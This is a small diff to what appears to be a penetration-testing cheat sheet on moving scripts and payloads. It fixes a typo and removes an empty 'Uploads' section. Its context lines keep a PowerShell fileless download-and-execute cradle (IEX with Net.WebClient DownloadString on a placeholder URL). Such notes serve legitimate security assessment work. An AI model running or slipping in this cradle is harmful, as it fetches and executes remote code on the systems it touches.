@@ -25,7 +25,7 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
   <details>
     <summary><strong>PowerShell DownloadString - Fileless Method</strong></summary>
 
-  Defaulr  
+  Default  
   ```powershell
   IEX (New-Object Net.WebClient).DownloadString('<FILE URL>')
   ```
@@ -127,9 +127,6 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
   
   </details>
   </details>
-    <summary><strong>📤 Uploads</strong></summary>
-      <details>
-      </details>
 </details>
 
 ---
